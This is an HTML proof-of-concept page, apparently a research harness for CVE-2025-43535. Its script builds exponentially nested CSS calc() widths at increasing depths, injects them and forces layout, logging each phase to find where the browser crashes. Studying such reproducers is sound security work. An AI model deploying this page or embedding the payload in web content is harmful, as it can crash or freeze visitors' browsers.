<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>V1 Phase Mapping</title>
<style>
body{font-family:monospace;font-size:14px}
</style>
</head>
<body>

<h3>CVE-2025-43535 — Variante 1 (Mapeamento de Fases)</h3>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");

function L(msg){
    const t = performance.now().toFixed(2);
    const line = `[${t}] ${msg}`;
    console.log(line);
    logEl.textContent += line + "\n";
}

function setPhase(name){
    document.title = name;
    L("===== " + name + " =====");
}

function wait(ms){
    return new Promise(r=>setTimeout(r,ms));
}

/* ================================
   V1 EXPONENCIAL DIRETA ORIGINAL
   ================================ */
function buildExponential(depth){
    let s = "1px";
    for(let i=0;i<depth;i++){
        s = "calc(" + s + " + " + s + ")";
    }
    return s;
}

/* ================================
   TESTE DE UM DEPTH
   ================================ */
async function testDepth(depth){

    L("════════════════════════════════════");
    L("TESTANDO DEPTH = " + depth);

    /* PHASE 1 — BUILD */
    setPhase("PHASE 1 BUILD");
    let expr = buildExponential(depth);
    L("Construção OK — length = " + expr.length);

    await wait(100);

    /* PHASE 2 — INSERT STYLE */
    setPhase("PHASE 2 INSERT");
    let style = document.createElement("style");
    document.head.appendChild(style);

    style.textContent = ".t{width:" + expr + "}";
    L("Inserção OK");

    await wait(100);

    /* PHASE 3 — YIELD */
    setPhase("PHASE 3 YIELD");
    await wait(100);

    /* PHASE 4 — LAYOUT */
    setPhase("PHASE 4 LAYOUT");
    let d = document.createElement("div");
    d.className = "t";
    document.body.appendChild(d);
    void d.offsetWidth;
    L("Layout OK");

    await wait(100);

    /* PHASE 5 — COMPUTED STYLE */
    setPhase("PHASE 5 COMPUTED");
    let cs = getComputedStyle(d).width;
    L("ComputedStyle OK: " + cs);

    await wait(100);

    setPhase("DEPTH COMPLETO " + depth);
    L("DEPTH " + depth + " COMPLETO SEM CRASH");
}

/* ================================
   EXECUÇÃO SEQUENCIAL
   ================================ */
(async function(){

    L("=== INÍCIO TESTE V1 ===");

    for(let depth=24; depth<=27; depth++){
        try{
            await testDepth(depth);
        }catch(e){
            L("ERRO CAPTURADO: " + e);
        }
        await wait(500);
    }

    L("=== FIM DOS TESTES ===");

})();
</script>

</body>
</html>
